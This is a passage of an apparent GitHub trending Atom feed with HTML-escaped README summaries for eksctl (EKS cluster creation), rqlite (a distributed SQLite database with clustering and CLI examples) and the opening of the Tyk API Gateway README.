&lt;th&gt;AWS Service&lt;/th&gt; &#xA;   &lt;th&gt;Access Level&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;CloudFormation&lt;/td&gt; &#xA;   &lt;td&gt;Full Access&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;EC2&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Full:&lt;/strong&gt; Tagging &lt;strong&gt;Limited:&lt;/strong&gt; List, Read, Write&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;EC2 Auto Scaling&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Limited:&lt;/strong&gt; List, Write&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;EKS&lt;/td&gt; &#xA;   &lt;td&gt;Full Access&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;IAM&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Limited:&lt;/strong&gt; List, Read, Write, Permissions Management&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Systems Manager&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Limited:&lt;/strong&gt; List, Read&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;The inline policy json is listed in &lt;a href=&#34;https://eksctl.io/usage/minimum-iam-policies/&#34;&gt;Minimal IAM Policies&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Docker&lt;/h3&gt; &#xA;&lt;p&gt;For every release and RC a docker image is pushed to &lt;a href=&#34;https://hub.docker.com/r/weaveworks/eksctl&#34;&gt;weaveworks/eksctl&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Basic usage&lt;/h2&gt; &#xA;&lt;p&gt;To create a basic cluster, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;eksctl create cluster&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A cluster will be created with default parameters&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;exciting auto-generated name, e.g. &#34;fabulous-mushroom-1527688624&#34;&lt;/li&gt; &#xA; &lt;li&gt;2x &lt;code&gt;m5.large&lt;/code&gt; nodes (this instance type suits most common use-cases, and is good value for money)&lt;/li&gt; &#xA; &lt;li&gt;use official AWS EKS AMI&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;us-west-2&lt;/code&gt; region&lt;/li&gt; &#xA; &lt;li&gt;dedicated VPC (check your quotas)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Once you have created a cluster, you will find that cluster credentials were added in &lt;code&gt;~/.kube/config&lt;/code&gt;. If you have &lt;code&gt;kubectl&lt;/code&gt; v1.10.x as well as &lt;code&gt;aws-iam-authenticator&lt;/code&gt; commands in your PATH, you should be able to use &lt;code&gt;kubectl&lt;/code&gt;. You will need to make sure to use the same AWS API credentials for this also. Check &lt;a href=&#34;https://docs.aws.amazon.com/eks/latest/userguide/configure-kubectl.html&#34;&gt;EKS docs&lt;/a&gt; for instructions. If you installed &lt;code&gt;eksctl&lt;/code&gt; via Homebrew, you should have all of these dependencies installed already.&lt;/p&gt; &#xA;&lt;p&gt;Example output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ eksctl create cluster&#xA;[ℹ]  eksctl version 0.6.0&#xA;[ℹ]  using region us-west-2&#xA;[ℹ]  setting availability zones to [us-west-2a us-west-2c us-west-2b]&#xA;[ℹ]  subnets for us-west-2a - public:192.168.0.0/19 private:192.168.96.0/19&#xA;[ℹ]  subnets for us-west-2c - public:192.168.32.0/19 private:192.168.128.0/19&#xA;[ℹ]  subnets for us-west-2b - public:192.168.64.0/19 private:192.168.160.0/19&#xA;[ℹ]  nodegroup &#34;ng-98b3b83a&#34; will use &#34;ami-05ecac759c81e0b0c&#34; [AmazonLinux2/1.11]&#xA;[ℹ]  creating EKS cluster &#34;floral-unicorn-1540567338&#34; in &#34;us-west-2&#34; region&#xA;[ℹ]  will create 2 separate CloudFormation stacks for cluster itself and the initial nodegroup&#xA;[ℹ]  if you encounter any issues, check CloudFormation console or try &#39;eksctl utils describe-stacks --region=us-west-2 --cluster=floral-unicorn-1540567338&#39;&#xA;[ℹ]  2 sequential tasks: { create cluster control plane &#34;floral-unicorn-1540567338&#34;, create managed nodegroup &#34;ng-98b3b83a&#34; }&#xA;[ℹ]  building cluster stack &#34;eksctl-floral-unicorn-1540567338-cluster&#34;&#xA;[ℹ]  deploying stack &#34;eksctl-floral-unicorn-1540567338-cluster&#34;&#xA;[ℹ]  building nodegroup stack &#34;eksctl-floral-unicorn-1540567338-nodegroup-ng-98b3b83a&#34;&#xA;[ℹ]  --nodes-min=2 was set automatically for nodegroup ng-98b3b83a&#xA;[ℹ]  --nodes-max=2 was set automatically for nodegroup ng-98b3b83a&#xA;[ℹ]  deploying stack &#34;eksctl-floral-unicorn-1540567338-nodegroup-ng-98b3b83a&#34;&#xA;[✔]  all EKS cluster resources for &#34;floral-unicorn-1540567338&#34; have been created&#xA;[✔]  saved kubeconfig as &#34;~/.kube/config&#34;&#xA;[ℹ]  adding role &#34;arn:aws:iam::376248598259:role/eksctl-ridiculous-sculpture-15547-NodeInstanceRole-1F3IHNVD03Z74&#34; to auth ConfigMap&#xA;[ℹ]  nodegroup &#34;ng-98b3b83a&#34; has 1 node(s)&#xA;[ℹ]  node &#34;ip-192-168-64-220.us-west-2.compute.internal&#34; is not ready&#xA;[ℹ]  waiting for at least 2 node(s) to become ready in &#34;ng-98b3b83a&#34;&#xA;[ℹ]  nodegroup &#34;ng-98b3b83a&#34; has 2 node(s)&#xA;[ℹ]  node &#34;ip-192-168-64-220.us-west-2.compute.internal&#34; is ready&#xA;[ℹ]  node &#34;ip-192-168-8-135.us-west-2.compute.internal&#34; is ready&#xA;[ℹ]  kubectl command should work with &#34;~/.kube/config&#34;, try &#39;kubectl get nodes&#39;&#xA;[✔]  EKS cluster &#34;floral-unicorn-1540567338&#34; in &#34;us-west-2&#34; region is ready&#xA;$&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Install &lt;code&gt;eksctl&lt;/code&gt; following the &lt;a href=&#34;https://eksctl.io/introduction/#installation&#34;&gt;installation instructions&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To learn more about what &lt;code&gt;eksctl&lt;/code&gt; can do check &lt;a href=&#34;https://eksctl.io&#34;&gt;eksctl.io&lt;/a&gt;. A good place to start is &lt;a href=&#34;https://eksctl.io/introduction/#getting-started&#34;&gt;Getting Started&lt;/a&gt;. The full list of features can be found &lt;a href=&#34;https://eksctl.io/introduction/#features&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributions&lt;/h2&gt; &#xA;&lt;p&gt;Code contributions are very welcome. If you are interested in helping make &lt;code&gt;eksctl&lt;/code&gt; great then see our &lt;a href=&#34;https://raw.githubusercontent.com/weaveworks/eksctl/main/CONTRIBUTING.md&#34;&gt;contributing guide&lt;/a&gt;. Or join the discussion on our &lt;a href=&#34;https://groups.google.com/forum/#!forum/eksctl&#34;&gt;mailing list&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;We follow the &lt;a href=&#34;https://raw.githubusercontent.com/weaveworks/eksctl/main/CODE_OF_CONDUCT.md&#34;&gt;CNCF Code of Conduct&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Releases&lt;/h2&gt; &#xA;&lt;p&gt;Minor releases of &lt;code&gt;eksctl&lt;/code&gt; should be expected every two weeks and patch releases will be made available as needed.&lt;/p&gt; &#xA;&lt;p&gt;One or more release candidate(s) (RC) builds will be made available prior to each minor release. RC builds are intended only for testing purposes.&lt;/p&gt; &#xA;&lt;h2&gt;Get in touch&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/weaveworks/eksctl/issues/new&#34;&gt;Create an issue&lt;/a&gt;, or login to &lt;a href=&#34;https://weave-community.slack.com/messages/eksctl/&#34;&gt;Weave Community Slack (#eksctl)&lt;/a&gt; (&lt;a href=&#34;https://slack.weave.works/&#34;&gt;signup&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;&lt;em&gt;Logo Credits&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;em&gt;Original Gophers drawn by &lt;a href=&#34;https://twitter.com/ashleymcnamara&#34;&gt;Ashley McNamara&lt;/a&gt;, unique E, K, S, C, T &amp;amp; L Gopher identities had been produced with &lt;a href=&#34;https://github.com/matryer/gopherize.me/&#34;&gt;Gopherize.me&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt;</summary>
  </entry>
  <entry>
    <title>rqlite/rqlite</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/rqlite/rqlite</id>
    <link href="https://github.com/rqlite/rqlite" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The lightweight, distributed relational database built on SQLite&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/rqlite/rqlite/master/DOC/logo-text.png&#34; height=&#34;100&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://circleci.com/gh/rqlite/rqlite/tree/master&#34;&gt;&lt;img src=&#34;https://circleci.com/gh/rqlite/rqlite/tree/master.svg?style=svg&#34; alt=&#34;Circle CI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.appveyor.com/project/otoolep/rqlite&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/github/rqlite/rqlite?branch=master&amp;amp;svg=true&#34; alt=&#34;appveyor&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/rqlite/rqlite&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/rqlite/rqlite&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/rqlite/rqlite/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/rqlite/rqlite.svg?sanitize=true&#34; alt=&#34;Release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/rqlite/rqlite/&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/rqlite/rqlite?style=plastic&#34; alt=&#34;Docker&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://groups.google.com/group/rqlite&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Google%20Group--blue.svg?sanitize=true&#34; alt=&#34;Google Group&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.philipotoole.com/join-rqlite-slack&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Slack--purple.svg?sanitize=true&#34; alt=&#34;Slack&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;rqlite&lt;/em&gt; is an easy-to-use, lightweight, distributed relational database, which uses &lt;a href=&#34;https://www.sqlite.org/&#34;&gt;SQLite&lt;/a&gt; as its storage engine. rqlite is simple to deploy, operating it is very straightforward, and its clustering capabilities provide you with fault-tolerance and high-availability. &lt;a href=&#34;https://github.com/rqlite/rqlite/releases&#34;&gt;rqlite is available for Linux, macOS, and Microsoft Windows&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Check out the &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/FAQ.md&#34;&gt;rqlite FAQ&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Why?&lt;/h3&gt; &#xA;&lt;p&gt;rqlite gives you the functionality of a &lt;a href=&#34;https://www.sqlite.org/testing.html&#34;&gt;rock solid&lt;/a&gt;, fault-tolerant, replicated relational database, but with very &lt;strong&gt;easy installation, deployment, and operation&lt;/strong&gt;. With it you&#39;ve got a &lt;strong&gt;lightweight&lt;/strong&gt; and &lt;strong&gt;reliable distributed relational data store&lt;/strong&gt;. Think &lt;a href=&#34;https://github.com/coreos/etcd/&#34;&gt;etcd&lt;/a&gt; or &lt;a href=&#34;https://github.com/hashicorp/consul&#34;&gt;Consul&lt;/a&gt;, but with relational data modelling also available.&lt;/p&gt; &#xA;&lt;p&gt;You could use rqlite as part of a larger system, as a central store for some critical relational data, without having to run larger, more complex distributed databases.&lt;/p&gt; &#xA;&lt;p&gt;Finally, if you&#39;re interested in understanding how distributed systems actually work, &lt;strong&gt;rqlite is a good example to study&lt;/strong&gt;. Much thought has gone into its &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/DESIGN.md&#34;&gt;design&lt;/a&gt; and implementation, with clear separation between the various components, including storage, distributed consensus, and API.&lt;/p&gt; &#xA;&lt;h3&gt;How?&lt;/h3&gt; &#xA;&lt;p&gt;rqlite uses &lt;a href=&#34;https://raft.github.io/&#34;&gt;Raft&lt;/a&gt; to achieve consensus across all the instances of the SQLite databases, ensuring that every change made to the system is made to a quorum of SQLite databases, or none at all. You can learn more about the design &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/DESIGN.md&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Key features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Trivially easy to deploy, with no need to separately install SQLite.&lt;/li&gt; &#xA; &lt;li&gt;Fully replicated production-grade SQL database, with full access to SQLite &lt;a href=&#34;https://www.sqlite.org/fts3.html&#34;&gt;full-text search&lt;/a&gt; and &lt;a href=&#34;https://www.sqlite.org/json1.html&#34;&gt;JSON document support&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hashicorp/raft&#34;&gt;Production-grade&lt;/a&gt; distributed consensus system.&lt;/li&gt; &#xA; &lt;li&gt;An easy-to-use &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/DATA_API.md&#34;&gt;HTTP(S) API&lt;/a&gt;. A &lt;a href=&#34;https://github.com/rqlite/rqlite/tree/master/cmd/rqlite&#34;&gt;command-line interface is also available&lt;/a&gt;, as are various &lt;a href=&#34;https://github.com/rqlite&#34;&gt;client libraries&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Multiple options for &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/AUTO_CLUSTERING.md&#34;&gt;node-discovery and automatic clustering, including integration with Kubernetes, Consul, etcd and DNS&lt;/a&gt;, allowing clusters to be dynamically created.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/SECURITY.md&#34;&gt;Extensive security and encryption support&lt;/a&gt;, including node-to-node encryption.&lt;/li&gt; &#xA; &lt;li&gt;Choice of &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/CONSISTENCY.md&#34;&gt;read consistency levels&lt;/a&gt;, and support for choosing &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/QUEUED_WRITES.md&#34;&gt;write performance over durability&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Optional &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/READ_ONLY_NODES.md&#34;&gt;read-only (non-voting) nodes&lt;/a&gt;, which can add read scalability to the system.&lt;/li&gt; &#xA; &lt;li&gt;A form of transaction support.&lt;/li&gt; &#xA; &lt;li&gt;Hot &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/BACKUPS.md&#34;&gt;backups&lt;/a&gt;, as well as &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/RESTORE_FROM_SQLITE.md&#34;&gt;load directly from SQLite&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Quick Start&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;Detailed documentation &lt;a href=&#34;https://github.com/rqlite/rqlite/tree/master/DOC&#34;&gt;is available&lt;/a&gt;. Check out the &lt;a href=&#34;https://groups.google.com/forum/#!forum/rqlite&#34;&gt;rqlite Google Group&lt;/a&gt; and join the &lt;a href=&#34;https://www.philipotoole.com/join-rqlite-slack&#34;&gt;rqlite Slack channel&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The quickest way to get running on macOS and Linux is to download a pre-built release binary. You can find these binaries on the &lt;a href=&#34;https://github.com/rqlite/rqlite/releases&#34;&gt;Github releases page&lt;/a&gt;. If you prefer Windows you can download the latest build &lt;a href=&#34;https://ci.appveyor.com/api/projects/otoolep/rqlite/artifacts/rqlite-latest-win64.zip?branch=master&#34;&gt;here&lt;/a&gt;. Once installed, you can start a single rqlite node like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rqlited -node-id 1 ~/node.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This single node automatically becomes the leader. You can pass &lt;code&gt;-h&lt;/code&gt; to &lt;code&gt;rqlited&lt;/code&gt; to list all configuration options.&lt;/p&gt; &#xA;&lt;h3&gt;Docker&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;docker run -p4001:4001 rqlite/rqlite&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Check out the &lt;a href=&#34;https://hub.docker.com/r/rqlite/rqlite/&#34;&gt;rqlite Docker page&lt;/a&gt; for more details on running nodes via Docker.&lt;/p&gt; &#xA;&lt;h3&gt;Homebrew&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;brew install rqlite&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Forming a cluster&lt;/h3&gt; &#xA;&lt;p&gt;While not strictly necessary to run rqlite, running multiple nodes means you&#39;ll have a fault-tolerant cluster. Start two more nodes, allowing the cluster to tolerate failure of a single node, like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rqlited -node-id 2 -http-addr localhost:4003 -raft-addr localhost:4004 -join http://localhost:4001 ~/node.2&#xA;rqlited -node-id 3 -http-addr localhost:4005 -raft-addr localhost:4006 -join http://localhost:4001 ~/node.3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;This demonstration shows all 3 nodes running on the same host. In reality you probably wouldn&#39;t do this, and then you wouldn&#39;t need to select different -http-addr and -raft-addr ports for each rqlite node.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;With just these few steps you&#39;ve now got a fault-tolerant, distributed relational database. For full details on creating and managing real clusters, including running read-only nodes, check out &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/CLUSTER_MGMT.md&#34;&gt;this documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Node Discovery and Automatic Clustering&lt;/h4&gt; &#xA;&lt;p&gt;rqlite can use &lt;a href=&#34;https://www.consul.io/&#34;&gt;Consul&lt;/a&gt;, &lt;a href=&#34;https://etcd.io/&#34;&gt;etcd&lt;/a&gt;, and DNS, for node discovery. This allows nodes to automatically connect and form a cluster. This can be much more convenient, allowing clusters to be dynamically created. Check out &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/AUTO_CLUSTERING.md&#34;&gt;the documentation&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;h4&gt;Kubernetes&lt;/h4&gt; &#xA;&lt;p&gt;Check out the &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/KUBERNETES.md&#34;&gt;Kubernetes&lt;/a&gt; deployment guide.&lt;/p&gt; &#xA;&lt;h3&gt;Inserting records&lt;/h3&gt; &#xA;&lt;p&gt;Let&#39;s insert some records via the &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/CLI.md&#34;&gt;rqlite CLI&lt;/a&gt;, using standard SQLite commands. Once inserted, these records will be replicated across the cluster, in a durable and fault-tolerant manner. Your 3-node cluster can suffer the failure of a single node without any loss of functionality or data.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ rqlite&#xA;127.0.0.1:4001&amp;gt; CREATE TABLE foo (id INTEGER NOT NULL PRIMARY KEY, name TEXT)&#xA;0 row affected (0.000668 sec)&#xA;127.0.0.1:4001&amp;gt; .schema&#xA;+-----------------------------------------------------------------------------+&#xA;| sql                                                                         |&#xA;+-----------------------------------------------------------------------------+&#xA;| CREATE TABLE foo (id INTEGER NOT NULL PRIMARY KEY, name TEXT)               |&#xA;+-----------------------------------------------------------------------------+&#xA;127.0.0.1:4001&amp;gt; INSERT INTO foo(name) VALUES(&#34;fiona&#34;)&#xA;1 row affected (0.000080 sec)&#xA;127.0.0.1:4001&amp;gt; SELECT * FROM foo&#xA;+----+-------+&#xA;| id | name  |&#xA;+----+-------+&#xA;| 1  | fiona |&#xA;+----+-------+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Data API&lt;/h2&gt; &#xA;&lt;p&gt;rqlite has a rich HTTP API, allowing full control over writing to, and querying from, rqlite. Check out &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/DATA_API.md&#34;&gt;the documentation&lt;/a&gt; for full details. There are also &lt;a href=&#34;https://github.com/rqlite&#34;&gt;client libraries available&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Performance&lt;/h2&gt; &#xA;&lt;p&gt;You can learn more about rqlite performance, and how to improve it, &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/PERFORMANCE.md&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;In-memory databases&lt;/h3&gt; &#xA;&lt;p&gt;By default rqlite uses an &lt;a href=&#34;https://www.sqlite.org/inmemorydb.html&#34;&gt;in-memory SQLite database&lt;/a&gt; to maximise performance. In this mode no actual SQLite file is created and the entire database is stored in memory. If you wish rqlite to use an actual file-based SQLite database, pass &lt;code&gt;-on-disk&lt;/code&gt; to rqlite on start-up.&lt;/p&gt; &#xA;&lt;h4&gt;Does using an in-memory database put my data at risk?&lt;/h4&gt; &#xA;&lt;p&gt;No.&lt;/p&gt; &#xA;&lt;p&gt;Since the Raft log is the authoritative store for all data, and it is stored on disk by each node, an in-memory database can be fully recreated on start-up from the information stored in the Raft log. Using an in-memory database does not put your data at risk.&lt;/p&gt; &#xA;&lt;h2&gt;Limitations&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In-memory databases are currently limited to 2GiB (2147483648 bytes) in size. You can learn more about possible ways to get around this limit in the &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/PERFORMANCE.md#in-memory-database-limits&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Only SQL statements that are &lt;a href=&#34;https://www.sqlite.org/deterministic.html&#34;&gt;&lt;strong&gt;deterministic&lt;/strong&gt;&lt;/a&gt; are safe to use with rqlite, because statements are committed to the Raft log before they are sent to each node. In other words, rqlite performs &lt;em&gt;statement-based replication&lt;/em&gt;. For example, the following statement could result in a different SQLite database under each node:&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;INSERT INTO foo (n) VALUES(random());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This has not been extensively tested, but you can directly read the SQLite file under any node at anytime, assuming you run in &#34;on-disk&#34; mode. However there is no guarantee that the SQLite file reflects all the changes that have taken place on the cluster unless you are sure the host node itself has received and applied all changes.&lt;/li&gt; &#xA; &lt;li&gt;In case it isn&#39;t obvious, rqlite does not replicate any changes made directly to any underlying SQLite file, when run in &#34;on disk&#34; mode. &lt;strong&gt;If you change the SQLite file directly, you may cause rqlite to fail&lt;/strong&gt;. Only modify the database via the HTTP API.&lt;/li&gt; &#xA; &lt;li&gt;SQLite dot-commands such as &lt;code&gt;.schema&lt;/code&gt; or &lt;code&gt;.tables&lt;/code&gt; are not directly supported by the API, but the &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/CLI.md&#34;&gt;rqlite CLI&lt;/a&gt; supports some very similar functionality. This is because those commands are features of the &lt;code&gt;sqlite3&lt;/code&gt; command, not SQLite itself.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Status and Diagnostics&lt;/h2&gt; &#xA;&lt;p&gt;You can learn how to check status and diagnostics &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/DIAGNOSTICS.md&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Backup and restore&lt;/h2&gt; &#xA;&lt;p&gt;Learn how to hot backup your rqlite cluster &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/BACKUPS.md&#34;&gt;here&lt;/a&gt;. You can also load data &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/RESTORE_FROM_SQLITE.md&#34;&gt;directly from a SQLite file&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Security&lt;/h2&gt; &#xA;&lt;p&gt;You can learn about securing access, and restricting users&#39; access, to rqlite &lt;a href=&#34;https://github.com/rqlite/rqlite/raw/master/DOC/SECURITY.md&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;rqlite Slack Channel&lt;/h2&gt; &#xA;&lt;p&gt;Join the &lt;a href=&#34;https://www.philipotoole.com/join-rqlite-slack&#34;&gt;Slack channel&lt;/a&gt; to learn more about rqlite.&lt;/p&gt; &#xA;&lt;h2&gt;Google Group&lt;/h2&gt; &#xA;&lt;p&gt;There is a &lt;a href=&#34;https://groups.google.com/forum/#!forum/rqlite&#34;&gt;Google Group&lt;/a&gt; dedicated to discussion of rqlite.&lt;/p&gt; &#xA;&lt;h2&gt;Pronunciation?&lt;/h2&gt; &#xA;&lt;p&gt;How do I pronounce rqlite? For what it&#39;s worth I try to pronounce it &#34;ree-qwell-lite&#34;. But it seems most people, including me, often pronouce it &#34;R Q lite&#34;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>TykTechnologies/tyk</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/TykTechnologies/tyk</id>
    <link href="https://github.com/TykTechnologies/tyk" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Tyk Open Source API Gateway written in Go, supporting REST, GraphQL, TCP and gRPC protocols&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Tyk API Gateway&lt;/h1&gt; &#xA;&lt;!-- [![Build Status](https://travis-ci.org/TykTechnologies/tyk.svg?branch=master)](https://travis-ci.org/TykTechnologies/tyk) --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://goreportcard.com/report/github.com/TykTechnologies/tyk&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/TykTechnologies/tyk&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://app.fossa.io/projects/git%2Bgithub.com%2FTykTechnologies%2Ftyk?ref=badge_shield&#34;&gt;&lt;img src=&#34;https://app.fossa.io/api/projects/git%2Bgithub.com%2FTykTechnologies%2Ftyk.svg?type=shield&#34; alt=&#34;FOSSA Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Tyk is an open source Enterprise API Gateway, supporting REST, GraphQL, TCP and gRPC protocols.&lt;/p&gt; &#xA;&lt;p&gt;Tyk Gateway is provided ‘Batteries-included’, with no feature lockout. Enabling your organization to control who accesses your APIs, when they access, and how they access it.&lt;/p&gt; &#xA;&lt;p&gt;Tyk Technologies uses the same API Gateway for all it’s applications. Protecting, securing, and processing APIs for thousands of organizations and businesses around the world. Ideal for Open Banking, building software in the clouds as well as exposing APIs to teams, partners &amp;amp; consumers.&lt;/p&gt; &#xA;&lt;p&gt;Built from the ground up to be the fastest API gateway on the planet. It does not depend on a legacy proxy underneath. It has no 3rd party dependencies aside from &lt;a href=&#34;https://github.com/redis/redis&#34;&gt;Redis&lt;/a&gt; for distributed rate-limiting and token storage. Tyk Gateway can also be deployed as part of a larger Full Lifecycle API Management platform &lt;a href=&#34;https://tyk.io/features/dashboard/&#34;&gt;Tyk Self-Managed&lt;/a&gt; which also includes Management Control Plane, Dashboard GUI and Developer Portal.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14009/109156132-8ae9d980-7781-11eb-88d7-0b77c753a9ca.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Open Source API Gateway Features&lt;/h1&gt; &#xA;&lt;p&gt;Use any protocol: REST, SOAP, &lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/graphql/&#34;&gt;GraphQL&lt;/a&gt;, &lt;a href=&#34;https://tyk.io/docs/key-concepts/grpc-proxy/&#34;&gt;gRPC&lt;/a&gt;, and &lt;a href=&#34;https://tyk.io/docs/key-concepts/tcp-proxy/&#34;&gt;TCP&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Industry Standard 